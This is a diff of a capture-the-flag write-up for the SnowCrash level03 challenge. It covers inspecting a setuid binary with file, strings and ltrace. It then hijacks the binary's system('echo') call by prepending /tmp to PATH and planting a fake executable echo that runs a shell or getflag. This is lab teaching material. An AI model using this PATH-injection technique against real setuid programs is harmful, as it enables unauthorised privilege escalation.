@@ -1,16 +1,41 @@
-# An executable file
-run "./level03" shows "Exploit me"
+# level03
 
-## Still GIYF
-- `string` command shows `setresgid`, `setresuid`, `system`, `getegid`,`geteuid` functions are used in the source code.
-- `ltrace` also shows these function calls.
+## level03 executable
+Run the binary file "level03" and got taunted: "Exploit me".
 
-## script injection
-Inside the system functioncall, the program calls the "/usr/bin/env echo ....."
-According to the exploit method found online. We can write a shell script and make the system call it.
-1. `ls -la` to make sure "level03" file is owned by other user then "level03".(it's owned by flag03)
-2. `echo "/bin/bash" > /tmp/echo` to make a fake echo program in which we launch a shell.
-3. `export PATH=/tmp:$PATH` to add "/tmp" in front of other path.( So the system will find the program first inside /tmp folder)
-4. Launch the level03 binary again. And~~~ our shell becomes "flag03@SnowCrash:~" instead of "level03@SnoCrash:~". Successfuly escalated the user right to flag03 :D
-5. Now we can run the "getflag" command and get the token
+## Reverse engineering
+Try to know what's inside this "level03" file.  
+Some tools:
+- file  
+A tool to get some basic information about a file.  
+Run `file ./level03` and we will get:  
+```
+./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
+```
+It shows that level03 file is an "ELF 32-bit LSB exaeutable", also "not stripped".
 
+- strings  
+print the strings of printable characters in files.  
+We can found `setresgid`, `setresuid`, `system`, `getegid`,`geteuid` functions been called.  
+
+- ltrace  
+A library call tracer.  
+Run `ltrace -i ./level03` and we can found this program calling "system()" function to launch "echo" whit the PATH stored in the "env".  
+
+## Almost the same as "Nebula Challenge" level01
+According to the exploit method found online. We can write a shell script and make the executable run it with the system call.
+Exploit the system() call with env injection.  
+1. Check the owner of the level03 file  
+Make sure this file has a "higher" privilege then the user "level03".  
+`ls -la ./level03` shows the owner as "flag03" who can launch "getflag" and actually get the flag.  
+2. Inject a new PATH into the env.  
+`export PATH=/tmp:$PATH` this adds "/tmp" path in front of other path so the programe inside "/tmp" will be called before other path (if that program exist).  
+3. Create a fake "echo" program
+`echo "getflag" > /tmp/echo`
+4. Make it executable
+`chmod +x /tmp/echo`
+5. Run ./level03 again and you've got flag
+
+## Notions 
+- Tools to read information inside a binary file.  
+- Env injection  
